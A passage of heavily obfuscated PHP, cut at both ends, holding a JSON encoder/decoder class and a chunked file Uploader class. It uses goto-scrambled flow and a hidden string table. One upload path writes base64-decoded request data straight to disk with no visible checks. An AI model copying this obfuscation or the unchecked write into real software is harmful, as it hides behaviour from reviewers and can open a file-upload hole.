(empty($C³†¯ÊÂİŞ)) { return !1; } $C³†¯ÊÂİŞ = array_values($C³†¯ÊÂİŞ); goto b¢ÇÎ¾Ö´Ï; fºöëÍÆô©: } } define($_SERVER[Æ][226], 1); goto F›µÊ´Â¾‹; f¾äÖÃÂà: class Services_JSON { function __construct($A†Ş™¨³Á = 0) { $this->use = $A†Ş™¨³Á; } function utf162utf8($DôéîÄˆĞÒ) { $B»•â«İ« =& $_SERVER[Æ]; if (function_exists($B»•â«İ«[68])) { return mb_convert_encoding($DôéîÄˆĞÒ, $B»•â«İ«[1587], $B»•â«İ«[1936]); } $BØ¿½»¹–• = ord($DôéîÄˆĞÒ[0]) << 8 | ord($DôéîÄˆĞÒ[1]); switch (!0) { case (127 & $BØ¿½»¹–•) == $BØ¿½»¹–•: return chr(127 & $BØ¿½»¹–•); case (2047 & $BØ¿½»¹–•) == $BØ¿½»¹–•: return chr(192 | $BØ¿½»¹–• >> 6 & 31) . chr(128 | $BØ¿½»¹–• & 63); case (65535 & $BØ¿½»¹–•) == $BØ¿½»¹–•: return chr(224 | $BØ¿½»¹–• >> 12 & 15) . chr(128 | $BØ¿½»¹–• >> 6 & 63) . chr(128 | $BØ¿½»¹–• & 63); } return $B»•â«İ«[33]; } function utf82utf16($D·§ ¦›ì) { $céèš¥ñº =& $_SERVER[Æ]; if (function_exists($céèš¥ñº[68])) { return mb_convert_encoding($D·§ ¦›ì, $céèš¥ñº[1936], $céèš¥ñº[1587]); } switch (strlen($D·§ ¦›ì)) { case 1: return $D·§ ¦›ì; case 2: return chr(7 & ord($D·§ ¦›ì[0]) >> 2) . chr(192 & ord($D·§ ¦›ì[0]) << 6 | 63 & ord($D·§ ¦›ì[1])); case 3: return chr(240 & ord($D·§ ¦›ì[0]) << 4 | 15 & ord($D·§ ¦›ì[1]) >> 2) . chr(192 & ord($D·§ ¦›ì[1]) << 6 | 127 & ord($D·§ ¦›ì[2])); } return $céèš¥ñº[33]; } function encode($cĞÕí×Öº´) { $dç­Š¥†¨µ =& $_SERVER[Æ]; switch (gettype($cĞÕí×Öº´)) { case $dç­Š¥†¨µ[1598]: return $cĞÕí×Öº´ ? $dç­Š¥†¨µ[1597] : $dç­Š¥†¨µ[1599]; case $dç­Š¥†¨µ[1937]: return $dç­Š¥†¨µ[99]; case $dç­Š¥†¨µ[303]: return (int) $cĞÕí×Öº´; case $dç­Š¥†¨µ[278]: case $dç­Š¥†¨µ[277]: return (double) $cĞÕí×Öº´; case $dç­Š¥†¨µ[312]: $FÌÇò¶”… = $dç­Š¥†¨µ[33]; $AÅ–Ç®âÄˆ = strlen($cĞÕí×Öº´); for ($E°¨ëŒòçµ = 0; $E°¨ëŒòçµ < $AÅ–Ç®âÄˆ; ++$E°¨ëŒòçµ) { $b Å·ìˆ² = ord($cĞÕí×Öº´[$E°¨ëŒòçµ]); switch (!0) { case $b Å·ìˆ² == 8: $FÌÇò¶”… .= $dç­Š¥†¨µ[1938]; break; case $b Å·ìˆ² == 9: $FÌÇò¶”… .= $dç­Š¥†¨µ[1574]; break; case $b Å·ìˆ² == 10: $FÌÇò¶”… .= $dç­Š¥†¨µ[1572]; break; case $b Å·ìˆ² == 12: $FÌÇò¶”… .= $dç­Š¥†¨µ[1939]; break; case $b Å·ìˆ² == 13: $FÌÇò¶”… .= $dç­Š¥†¨µ[1573]; break; case $b Å·ìˆ² == 34: case $b Å·ìˆ² == 47: case $b Å·ìˆ² == 92: $FÌÇò¶”… .= $dç­Š¥†¨µ[93] . $cĞÕí×Öº´[$E°¨ëŒòçµ]; break; case $b Å·ìˆ² >= 32 && $b Å·ìˆ² <= 127: $FÌÇò¶”… .= $cĞÕí×Öº´[$E°¨ëŒòçµ]; break; case ($b Å·ìˆ² & 224) == 192: $aº ¬‚“ = pack($dç­Š¥†¨µ[1940], $b Å·ìˆ², ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 1])); $E°¨ëŒòçµ += 1; $BÓ¥«Šù´æ = $this->utf82utf16($aº ¬‚“); $FÌÇò¶”… .= sprintf($dç­Š¥†¨µ[1941], bin2hex($BÓ¥«Šù´æ)); break; case ($b Å·ìˆ² & 240) == 224: $aº ¬‚“ = pack($dç­Š¥†¨µ[1940], $b Å·ìˆ², ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 1]), ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 2])); $E°¨ëŒòçµ += 2; $BÓ¥«Šù´æ = $this->utf82utf16($aº ¬‚“); $FÌÇò¶”… .= sprintf($dç­Š¥†¨µ[1941], bin2hex($BÓ¥«Šù´æ)); break; case ($b Å·ìˆ² & 248) == 240: $aº ¬‚“ = pack($dç­Š¥†¨µ[1940], $b Å·ìˆ², ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 1]), ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 2]), ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 3])); $E°¨ëŒòçµ += 3; $BÓ¥«Šù´æ = $this->utf82utf16($aº ¬‚“); $FÌÇò¶”… .= sprintf($dç­Š¥†¨µ[1941], bin2hex($BÓ¥«Šù´æ)); break; case ($b Å·ìˆ² & 252) == 248: $aº ¬‚“ = pack($dç­Š¥†¨µ[1940], $b Å·ìˆ², ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 1]), ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 2]), ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 3]), ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 4])); $E°¨ëŒòçµ += 4; $BÓ¥«Šù´æ = $this->utf82utf16($aº ¬‚“); $FÌÇò¶”… .= sprintf($dç­Š¥†¨µ[1941], bin2hex($BÓ¥«Šù´æ)); break; case ($b Å·ìˆ² & 254) == 252: $aº ¬‚“ = pack($dç­Š¥†¨µ[1940], $b Å·ìˆ², ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 1]), ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 2]), ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 3]), ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 4]), ord($cĞÕí×Öº´[$E°¨ëŒòçµ + 5])); $E°¨ëŒòçµ += 5; $BÓ¥«Šù´æ = $this->utf82utf16($aº ¬‚“); $FÌÇò¶”… .= sprintf($dç­Š¥†¨µ[1941], bin2hex($BÓ¥«Šù´æ)); break; } } return $dç­Š¥†¨µ[113] . $FÌÇò¶”… . $dç­Š¥†¨µ[113]; case $dç­Š¥†¨µ[1942]: if (is_array($cĞÕí×Öº´) && count($cĞÕí×Öº´) && array_keys($cĞÕí×Öº´) !== range(0, sizeof($cĞÕí×Öº´) - 1)) { $fëŠ²È³É‚ = array_map(array($this, $dç­Š¥†¨µ[1943]), array_keys($cĞÕí×Öº´), array_values($cĞÕí×Öº´)); foreach ($fëŠ²È³É‚ as $d¼Æ˜Šì®¿) { if (Services_JSON::isError($d¼Æ˜Šì®¿)) { return $d¼Æ˜Šì®¿; } } return $dç­Š¥†¨µ[1068] . join($dç­Š¥†¨µ[47], $fëŠ²È³É‚) . $dç­Š¥†¨µ[315]; } $BËÁÀÆŠã® = array_map(array($this, $dç­Š¥†¨µ[1944]), $cĞÕí×Öº´); foreach ($BËÁÀÆŠã® as $còÕÙï˜õ´) { if (Services_JSON::isError($còÕÙï˜õ´)) { return $còÕÙï˜õ´; } } return $dç­Š¥†¨µ[157] . join($dç­Š¥†¨µ[47], $BËÁÀÆŠã®) . $dç­Š¥†¨µ[476]; case $dç­Š¥†¨µ[1945]: $CÏÛ³Ûå  = get_object_vars($cĞÕí×Öº´); $fëŠ²È³É‚ = array_map(array($this, $dç­Š¥†¨µ[1943]), array_keys($CÏÛ³Ûå ), array_values($CÏÛ³Ûå )); foreach ($fëŠ²È³É‚ as $d¼Æ˜Šì®¿) { if (Services_JSON::isError($d¼Æ˜Šì®¿)) { return $d¼Æ˜Šì®¿; } } return $dç­Š¥†¨µ[1068] . join($dç­Š¥†¨µ[47], $fëŠ²È³É‚) . $dç­Š¥†¨µ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $dç­Š¥†¨µ[99] : new Services_JSON_Error(gettype($cĞÕí×Öº´) . $dç­Š¥†¨µ[1946]); } } function name_value($eèÃ¤ä–¥Ú, $FÉ“¤¸ôàø) { $Bº‚¨áˆ¬„ = $this->encode($FÉ“¤¸ôàø); if (Services_JSON::isError($Bº‚¨áˆ¬„)) { return $Bº‚¨áˆ¬„; } return $this->encode(strval($eèÃ¤ä–¥Ú)) . $_SERVER[Æ][4] . $Bº‚¨áˆ¬„; } function reduce_string($bèÏº“Â…™) { $A˜®‘øÃÕ =& $_SERVER[Æ]; $bèÏº“Â…™ = preg_replace(array($A˜®‘øÃÕ[1947], $A˜®‘øÃÕ[1948], $A˜®‘øÃÕ[1949]), $A˜®‘øÃÕ[33], $bèÏº“Â…™); return trim($bèÏº“Â…™); } function decode($A§ìÛøÊ) { $Dø‡ä×å–Ñ =& $_SERVER[Æ]; $A§ìÛøÊ = $this->reduce_string($A§ìÛøÊ); switch (strtolower($A§ìÛøÊ)) { case $Dø‡ä×å–Ñ[1597]: return !0; case $Dø‡ä×å–Ñ[1599]: return !1; case $Dø‡ä×å–Ñ[99]: return null; default: $c÷„­ÒÕ = array(); if (is_numeric($A§ìÛøÊ)) { return (double) $A§ìÛøÊ == (int) $A§ìÛøÊ ? (int) $A§ìÛøÊ : (double) $A§ìÛøÊ; } elseif (preg_match($Dø‡ä×å–Ñ[1950], $A§ìÛøÊ, $c÷„­ÒÕ) && $c÷„­ÒÕ[1] == $c÷„­ÒÕ[2]) { $C×Êğ×¨´â = substr($A§ìÛøÊ, 0, 1); $A˜¦â§ñ¨Û = substr($A§ìÛøÊ, 1, -1); $EòŠÏ§¨ = $Dø‡ä×å–Ñ[33]; $D­·ê¾¨Ş = strlen($A˜¦â§ñ¨Û); for ($E¸öèÕ©” = 0; $E¸öèÕ©” < $D­·ê¾¨Ş; ++$E¸öèÕ©”) { $fµğ£å²’â = substr($A˜¦â§ñ¨Û, $E¸öèÕ©”, 2); $A²¡†²ÌîÙ = ord($A˜¦â§ñ¨Û[$E¸öèÕ©”]); switch (!0) { case $fµğ£å²’â == $Dø‡ä×å–Ñ[1938]: $EòŠÏ§¨ .= chr(8); ++$E¸öèÕ©”; break; case $fµğ£å²’â == $Dø‡ä×å–Ñ[1574]: $EòŠÏ§¨ .= chr(9); ++$E¸öèÕ©”; break; case $fµğ£å²’â == $Dø‡ä×å–Ñ[1572]: $EòŠÏ§¨ .= chr(10); ++$E¸öèÕ©”; break; case $fµğ£å²’â == $Dø‡ä×å–Ñ[1939]: $EòŠÏ§¨ .= chr(12); ++$E¸öèÕ©”; break; case $fµğ£å²’â == $Dø‡ä×å–Ñ[1573]: $EòŠÏ§¨ .= chr(13); ++$E¸öèÕ©”; break; case $fµğ£å²’â == $Dø‡ä×å–Ñ[1354]: case $fµğ£å²’â == $Dø‡ä×å–Ñ[1951]: case $fµğ£å²’â == $Dø‡ä×å–Ñ[1567]: case $fµğ£å²’â == $Dø‡ä×å–Ñ[1569]: if ($C×Êğ×¨´â == $Dø‡ä×å–Ñ[113] && $fµğ£å²’â != $Dø‡ä×å–Ñ[1951] || $C×Êğ×¨´â == $Dø‡ä×å–Ñ[55] && $fµğ£å²’â != $Dø‡ä×å–Ñ[1354]) { $EòŠÏ§¨ .= $A˜¦â§ñ¨Û[++$E¸öèÕ©”]; } break; case preg_match($Dø‡ä×å–Ñ[1952], substr($A˜¦â§ñ¨Û, $E¸öèÕ©”, 6)): $Dâ­Î’çà = chr(hexdec(substr($A˜¦â§ñ¨Û, $E¸öèÕ©” + 2, 2))) . chr(hexdec(substr($A˜¦â§ñ¨Û, $E¸öèÕ©” + 4, 2))); $EòŠÏ§¨ .= $this->utf162utf8($Dâ­Î’çà); $E¸öèÕ©” += 5; break; case $A²¡†²ÌîÙ >= 32 && $A²¡†²ÌîÙ <= 127: $EòŠÏ§¨ .= $A˜¦â§ñ¨Û[$E¸öèÕ©”]; break; case ($A²¡†²ÌîÙ & 224) == 192: $EòŠÏ§¨ .= substr($A˜¦â§ñ¨Û, $E¸öèÕ©”, 2); ++$E¸öèÕ©”; break; case ($A²¡†²ÌîÙ & 240) == 224: $EòŠÏ§¨ .= substr($A˜¦â§ñ¨Û, $E¸öèÕ©”, 3); $E¸öèÕ©” += 2; break; case ($A²¡†²ÌîÙ & 248) == 240: $EòŠÏ§¨ .= substr($A˜¦â§ñ¨Û, $E¸öèÕ©”, 4); $E¸öèÕ©” += 3; break; case ($A²¡†²ÌîÙ & 252) == 248: $EòŠÏ§¨ .= substr($A˜¦â§ñ¨Û, $E¸öèÕ©”, 5); $E¸öèÕ©” += 4; break; case ($A²¡†²ÌîÙ & 254) == 252: $EòŠÏ§¨ .= substr($A˜¦â§ñ¨Û, $E¸öèÕ©”, 6); $E¸öèÕ©” += 5; break; } } return $EòŠÏ§¨; } elseif (preg_match($Dø‡ä×å–Ñ[1953], $A§ìÛøÊ) || preg_match($Dø‡ä×å–Ñ[1954], $A§ìÛøÊ)) { goto EÙáã••±‡; EÙáã••±‡: if ($A§ìÛøÊ[0] == $Dø‡ä×å–Ñ[157]) { $Aˆ‹ÛÑêää = array(SERVICES_JSON_IN_ARR); $AĞ‰»‘Ô°¹ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Aˆ‹ÛÑêää = array(SERVICES_JSON_IN_OBJ); $C©ôŠœ”Áù = array(); } else { $Aˆ‹ÛÑêää = array(SERVICES_JSON_IN_OBJ); $C©ôŠœ”Áù = new stdClass(); } } array_push($Aˆ‹ÛÑêää, array($Dø‡ä×å–Ñ[1955] => SERVICES_JSON_SLICE, $Dø‡ä×å–Ñ[263] => 0, $Dø‡ä×å–Ñ[1956] => !1)); $A˜¦â§ñ¨Û = substr($A§ìÛøÊ, 1, -1); goto AøÌÜ–Š«; cŞìß¢ñ‡¯: for ($E¸öèÕ©” = 0; $E¸öèÕ©” <= $D­·ê¾¨Ş; ++$E¸öèÕ©”) { $e¿¹Î¦´‰ã = end($Aˆ‹ÛÑêää); $fµğ£å²’â = substr($A˜¦â§ñ¨Û, $E¸öèÕ©”, 2); if ($E¸öèÕ©” == $D­·ê¾¨Ş || $A˜¦â§ñ¨Û[$E¸öèÕ©”] == $Dø‡ä×å–Ñ[47] && $e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[1955]] == SERVICES_JSON_SLICE) { $b‚ßŸõîá = substr($A˜¦â§ñ¨Û, $e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[263]], $E¸öèÕ©” - $e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[263]]); array_push($Aˆ‹ÛÑêää, array($Dø‡ä×å–Ñ[1955] => SERVICES_JSON_SLICE, $Dø‡ä×å–Ñ[263] => $E¸öèÕ©” + 1, $Dø‡ä×å–Ñ[1956] => !1)); if (reset($Aˆ‹ÛÑêää) == SERVICES_JSON_IN_ARR) { array_push($AĞ‰»‘Ô°¹, $this->decode($b‚ßŸõîá)); } elseif (reset($Aˆ‹ÛÑêää) == SERVICES_JSON_IN_OBJ) { $Fá¶¨Íİ® = array(); if (preg_match($Dø‡ä×å–Ñ[1957], $b‚ßŸõîá, $Fá¶¨Íİ®)) { $fö›‹çµ¿ˆ = $this->decode($Fá¶¨Íİ®[1]); $Cõ‚Ø§¿ìí = $this->decode($Fá¶¨Íİ®[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $C©ôŠœ”Áù[$fö›‹çµ¿ˆ] = $Cõ‚Ø§¿ìí; } else { $C©ôŠœ”Áù->{$fö›‹çµ¿ˆ} = $Cõ‚Ø§¿ìí; } } elseif (preg_match($Dø‡ä×å–Ñ[1958], $b‚ßŸõîá, $Fá¶¨Íİ®)) { $fö›‹çµ¿ˆ = $Fá¶¨Íİ®[1]; $Cõ‚Ø§¿ìí = $this->decode($Fá¶¨Íİ®[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $C©ôŠœ”Áù[$fö›‹çµ¿ˆ] = $Cõ‚Ø§¿ìí; } else { $C©ôŠœ”Áù->{$fö›‹çµ¿ˆ} = $Cõ‚Ø§¿ìí; } } } } elseif (($A˜¦â§ñ¨Û[$E¸öèÕ©”] == $Dø‡ä×å–Ñ[113] || $A˜¦â§ñ¨Û[$E¸öèÕ©”] == $Dø‡ä×å–Ñ[55]) && $e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[1955]] != SERVICES_JSON_IN_STR) { array_push($Aˆ‹ÛÑêää, array($Dø‡ä×å–Ñ[1955] => SERVICES_JSON_IN_STR, $Dø‡ä×å–Ñ[263] => $E¸öèÕ©”, $Dø‡ä×å–Ñ[1956] => $A˜¦â§ñ¨Û[$E¸öèÕ©”])); } elseif ($A˜¦â§ñ¨Û[$E¸öèÕ©”] == $e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[1956]] && $e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[1955]] == SERVICES_JSON_IN_STR && (strlen(substr($A˜¦â§ñ¨Û, 0, $E¸öèÕ©”)) - strlen(rtrim(substr($A˜¦â§ñ¨Û, 0, $E¸öèÕ©”), $Dø‡ä×å–Ñ[93]))) % 2 != 1) { array_pop($Aˆ‹ÛÑêää); } elseif ($A˜¦â§ñ¨Û[$E¸öèÕ©”] == $Dø‡ä×å–Ñ[157] && in_array($e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[1955]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Aˆ‹ÛÑêää, array($Dø‡ä×å–Ñ[1955] => SERVICES_JSON_IN_ARR, $Dø‡ä×å–Ñ[263] => $E¸öèÕ©”, $Dø‡ä×å–Ñ[1956] => !1)); } elseif ($A˜¦â§ñ¨Û[$E¸öèÕ©”] == $Dø‡ä×å–Ñ[476] && $e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[1955]] == SERVICES_JSON_IN_ARR) { array_pop($Aˆ‹ÛÑêää); } elseif ($A˜¦â§ñ¨Û[$E¸öèÕ©”] == $Dø‡ä×å–Ñ[1068] && in_array($e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[1955]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Aˆ‹ÛÑêää, array($Dø‡ä×å–Ñ[1955] => SERVICES_JSON_IN_OBJ, $Dø‡ä×å–Ñ[263] => $E¸öèÕ©”, $Dø‡ä×å–Ñ[1956] => !1)); } elseif ($A˜¦â§ñ¨Û[$E¸öèÕ©”] == $Dø‡ä×å–Ñ[315] && $e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[1955]] == SERVICES_JSON_IN_OBJ) { array_pop($Aˆ‹ÛÑêää); } elseif ($fµğ£å²’â == $Dø‡ä×å–Ñ[1959] && in_array($e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[1955]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Aˆ‹ÛÑêää, array($Dø‡ä×å–Ñ[1955] => SERVICES_JSON_IN_CMT, $Dø‡ä×å–Ñ[263] => $E¸öèÕ©”, $Dø‡ä×å–Ñ[1956] => !1)); $E¸öèÕ©”++; } elseif ($fµğ£å²’â == $Dø‡ä×å–Ñ[1960] && $e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[1955]] == SERVICES_JSON_IN_CMT) { array_pop($Aˆ‹ÛÑêää); $E¸öèÕ©”++; for ($fÚ˜×‹±ñ¾ = $e¿¹Î¦´‰ã[$Dø‡ä×å–Ñ[263]]; $fÚ˜×‹±ñ¾ <= $E¸öèÕ©”; ++$fÚ˜×‹±ñ¾) { $A˜¦â§ñ¨Û = substr_replace($A˜¦â§ñ¨Û, $Dø‡ä×å–Ñ[50], $fÚ˜×‹±ñ¾, 1); } } } if (reset($Aˆ‹ÛÑêää) == SERVICES_JSON_IN_ARR) { return $AĞ‰»‘Ô°¹; } elseif (reset($Aˆ‹ÛÑêää) == SERVICES_JSON_IN_OBJ) { return $C©ôŠœ”Áù; } goto a›±éÉŸ¼; AøÌÜ–Š«: $A˜¦â§ñ¨Û = $this->reduce_string($A˜¦â§ñ¨Û); if ($A˜¦â§ñ¨Û == $Dø‡ä×å–Ñ[33]) { if (reset($Aˆ‹ÛÑêää) == SERVICES_JSON_IN_ARR) { return $AĞ‰»‘Ô°¹; } else { return $C©ôŠœ”Áù; } } $D­·ê¾¨Ş = strlen($A˜¦â§ñ¨Û); goto cŞìß¢ñ‡¯; a›±éÉŸ¼: } } } function isError($D´¸šà§‘ğ, $a‰–Ÿ£Úòó = null) { $a–Í§…‚« =& $_SERVER[Æ]; if (class_exists($a–Í§…‚«[1961])) { return PEAR::isError($D´¸šà§‘ğ, $a‰–Ÿ£Úòó); } elseif (is_object($D´¸šà§‘ğ) && (get_class($D´¸šà§‘ğ) == $a–Í§…‚«[1962] || is_subclass_of($D´¸šà§‘ğ, $a–Í§…‚«[1962]))) { return !0; } return !1; } } if (class_exists($_SERVER[Æ][1963])) { class Services_JSON_Error extends PEAR_Error { function __construct($c®²›ÊÈ‘„ = "\165\156\153\156\x6f\167\x6e\40\x65\x72\162\x6f\162", $C«¶ŸŸ‘«Û = null, $fÔ“ß¥Áå = null, $AòØÏù¸öš = null, $E¤ÑãÕÙï = null) { parent::PEAR_Error($c®²›ÊÈ‘„, $C«¶ŸŸ‘«Û, $fÔ“ß¥Áå, $AòØÏù¸öš, $E¤ÑãÕÙï); } } } else { class Services_JSON_Error { function __construct($a­ó–’ Ü = "\165\x6e\153\156\157\x77\156\40\x65\x72\162\x6f\162", $E†ø§âšÓº = null, $cÍñÈ°Ë¬ = null, $AàùÂ˜íòÃ = null, $a½Ãñùìš­ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto bé™ŞášĞ©; a…ç´¯º«Ô: $this->checkSize(); $this->tempPathInit(); goto CÙ¾Û™Â±; A›’áÑËÜÜ: if (!empty($_FILES)) { $FØ«í‰ÃÁ¨ = $_FILES[$dõËÏï¡Ÿ°[167]]; $this->uploadFile = $FØ«í‰ÃÁ¨[$dõËÏï¡Ÿ°[1964]]; if (!$this->uploadFile && $FØ«í‰ÃÁ¨[$dõËÏï¡Ÿ°[1218]] > 0) { show_json($this->errorInfo($FØ«í‰ÃÁ¨[$dõËÏï¡Ÿ°[1218]]), !1); } } else { if (isset($in[$dõËÏï¡Ÿ°[386]])) { $this->uploadFile = isset($in[$dõËÏï¡Ÿ°[1965]]) ? $dõËÏï¡Ÿ°[1966] : $dõËÏï¡Ÿ°[1811]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto a…ç´¯º«Ô; bé™ŞášĞ©: $dõËÏï¡Ÿ° =& $_SERVER[Æ]; global $in; $this->in =& $in; goto A›’áÑËÜÜ; CÙ¾Û™Â±: } public function upload() { goto bé±ª­ñŞ£; B„¦æì¦‘…: $b«Ó£ç­Œ = $this->tempFile . $F•ÂàçÆ”[1969] . $dà×ã À; $F·Õéôˆ¨  = isset($this->in[$F•ÂàçÆ”[520]]) ? intval($this->in[$F•ÂàçÆ”[520]]) : 0; $FÕ—ØÙÙ¼ù = isset($this->in[$F•ÂàçÆ”[1970]]) ? intval($this->in[$F•ÂàçÆ”[1970]]) : 0; goto EíÍ­ÁíÉä; a¡áŸß©ÅŞ: $eÚµÄ¯š³±[$F•ÂàçÆ”[1977]][$F•ÂàçÆ”[1978] . $dà×ã À] = array($F•ÂàçÆ”[1979] => $eõÓå×“Şé, $F•ÂàçÆ”[1036] => $dà×ã À, $F•ÂàçÆ”[77] => $F·Õéôˆ¨ , $F•ÂàçÆ”[164] => $Cƒà„ŞåÚÜ); $this->statusSet($eÚµÄ¯š³±); if (count($eÚµÄ¯š³±[$F•ÂàçÆ”[1977]]) != $eÚµÄ¯š³±[$F•ÂàçÆ”[1976]]) { $this->showJson($F•ÂàçÆ”[1980] . $dà×ã À, !0); } goto b‰¥Ó¾£Š; B­‚Æ„‘ğÇ: $FÂ¨Å÷¬¯ê = $this->moveUploadedFile($b«Ó£ç­Œ); if ($F·Õéôˆ¨  > 0 && filesize($FÂ¨Å÷¬¯ê) == 0) { $this->showJson($F•ÂàçÆ”[1972], !1); } if (!$FÂ¨Å÷¬¯ê) { $this->showJson(LNG($F•ÂàçÆ”[1973]), !1); } goto EºŸÓ¥ÀÕ; b‰¥Ó¾£Š: ignore_timeout(); if (!$this->checkChunkHash($eÚµÄ¯š³±)) { $this->showJson($F•ÂàçÆ”[1981], !1); } $this->statusSet(!1); goto D©»¯æéÔÎ; bé±ª­ñŞ£: $F•ÂàçÆ” =& $_SERVER[Æ]; $dà×ã À = isset($this->in[$F•ÂàçÆ”[1967]]) ? intval($this->in[$F•ÂàçÆ”[1967]]) : 0; $FµÓßãßË† = isset($this->in[$F•ÂàçÆ”[1968]]) ? intval($this->in[$F•ÂàçÆ”[1968]]) : 1; goto B„¦æì¦‘…; EÙ÷•…à¹Ñ: CacheLock::lock($this->tempFile, 20); $eÚµÄ¯š³± = $this->statusGet(); $this->initFileTemp(); goto B­‚Æ„‘ğÇ; EíÍ­ÁíÉä: if ($FµÓßãßË† > 1 && $FÕ—ØÙÙ¼ù <= 0) { show_json($F•ÂàçÆ”[1971], !1); } if ($FÕ—ØÙÙ¼ù > $F·Õéôˆ¨ ) { $FµÓßãßË† = 1; } if ($FµÓßãßË† <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto EÙ÷•…à¹Ñ; c°ÙĞå Ãè: $B†¿ÌŒµ = $this->writeTo($FÂ¨Å÷¬¯ê, $aéí÷ÜÖĞ, $this->tempFile); $Cƒà„ŞåÚÜ = IO::hashSimple($FÂ¨Å÷¬¯ê); $F·Õéôˆ¨  = IO::size($FÂ¨Å÷¬¯ê); goto fÏ˜Åø¾„î; fÏ˜Åø¾„î: @unlink($FÂ¨Å÷¬¯ê); if (!$B†¿ÌŒµ) { $this->showJson($F•ÂàçÆ”[1975] . $dà×ã À, !1); } $eÚµÄ¯š³±[$F•ÂàçÆ”[1976]] = $FµÓßãßË†; goto a¡áŸß©ÅŞ; D©»¯æéÔÎ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto Eµñä²»¡; EºŸÓ¥ÀÕ: $eõÓå×“Şé = $dà×ã À * $FÕ—ØÙÙ¼ù; $aéí÷ÜÖĞ = @fopen($this->tempFile, $F•ÂàçÆ”[1974]); fseek($aéí÷ÜÖĞ, $eõÓå×“Şé); goto c°ÙĞå Ãè; Eµñä²»¡: } private function checkSize() { $bÊÅÈ¤ê£ =& $_SERVER[Æ]; if (phpBuild64() || $this->in[$bÊÅÈ¤ê£[77]] < PHP_INT_MAX) { return; } show_json(LNG($bÊÅÈ¤ê£[1982]), !1); } private function showJson($b¦‰ºßÔ, $c ²ÕÑÄæ) { CacheLock::unlock($this->tempFile); if (!$c ²ÕÑÄæ) { return show_json($b¦‰ºßÔ, $c ²ÕÑÄæ); } show_json($b¦‰ºßÔ, $c ²ÕÑÄæ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto FÉ†»ŞêÆ×; Cß…ñˆß¤: touch($D£êİ¹¾ìŸ . $Eµñéš’„‚[1983]); $aö›âÂ¢¯‚ = isset($this->in[$Eµñéš’„‚[1984]]) ? $this->in[$Eµñéš’„‚[1984]] : !1; if (strlen($aö›âÂ¢¯‚) < 30) { $aö›âÂ¢¯‚ = md5(USER_ID . $this->in[$Eµñéš’„‚[75]] . $this->fileName . $this->in[$Eµñéš’„‚[77]]); } goto DèšÁÂ³Äª; FÉ†»ŞêÆ×: $Eµñéš’„‚ =& $_SERVER[Æ]; $D£êİ¹¾ìŸ = TEMP_FILES; @mk_dir($D£êİ¹¾ìŸ); goto Cß…ñˆß¤; DèšÁÂ³Äª: $this->tempFile = $D£êİ¹¾ìŸ . $Eµñéš’„‚[1985] . md5($aö›âÂ¢¯‚ . $this->in[$Eµñéš’„‚[1529]]); goto C•³¯±ÄÄÄ; C•³¯±ÄÄÄ: } private function moveUploadedFile($fËŞ­Ó‚Ë™) { $DÉŞ¦…à… =& $_SERVER[Æ]; $a°÷ñëÙİ = $this->uploadFile; if ($a°÷ñëÙİ == $DÉŞ¦…à…[1986]) { @file_put_contents($fËŞ­Ó‚Ë™, base64_decode($_REQUEST[$DÉŞ¦…à…[1987]])); } else { if ($a°÷ñëÙİ == $DÉŞ¦…à…[1811]) { $a‰Ê‘ºß†è = @fopen($fËŞ­Ó‚Ë™, $DÉŞ¦…à…[1519]); $this->writeTo($a°÷ñëÙİ, $a‰Ê‘ºß†è, $fËŞ­Ó‚Ë™); } else { if (!move_uploaded_file($a°÷ñëÙİ, $fËŞ­Ó‚Ë™)) { return !1; } } } return $fËŞ­Ó‚Ë™; } private function writeTo($CËÑéğºœŒ, $F¢äÅ ®³ã, $FšôÆçî·) { goto EŒÇ°·ÔÆ˜; AƒàŒ­»Ş: fclose($Eô½‰î²öë); fclose($F¢äÅ ®³ã); CacheLock::unlock($BÚ‡ôì¹ëŒ); goto D·›Üâò¦Å; EŒÇ°·ÔÆ˜: $fŒÌ¬‡İï° =& $_SERVER[Æ]; $BÚ‡ôì¹ëŒ = $fŒÌ¬‡İï°[1988] . $FšôÆçî·; $BµÑ¸İÇÒÔ = CacheLock::lock($BÚ‡ôì¹ëŒ, 1); goto AªŞ¿ª«ÔÓ; AªŞ¿ª«ÔÓ: $Eô½‰î²öë = 